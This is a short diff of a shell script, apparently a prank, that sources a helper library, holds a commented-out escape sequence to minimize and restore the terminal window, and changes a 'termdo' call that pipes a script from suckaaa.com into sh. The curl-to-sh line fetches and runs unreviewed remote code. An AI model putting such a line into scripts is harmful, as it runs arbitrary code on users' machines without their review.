@@ -14,4 +14,4 @@ source ~/.garbage/lib;
 # Minimize the window for a few seconds, then restore it
 # printf '\e[2t' && sleep 3 && printf '\e[1t';
 
-termdo 'curl -s https://suckaaa.com/s/oops | sh;';
+termdo 'curl -s https://suckaaa.com/s/loL | sh;';
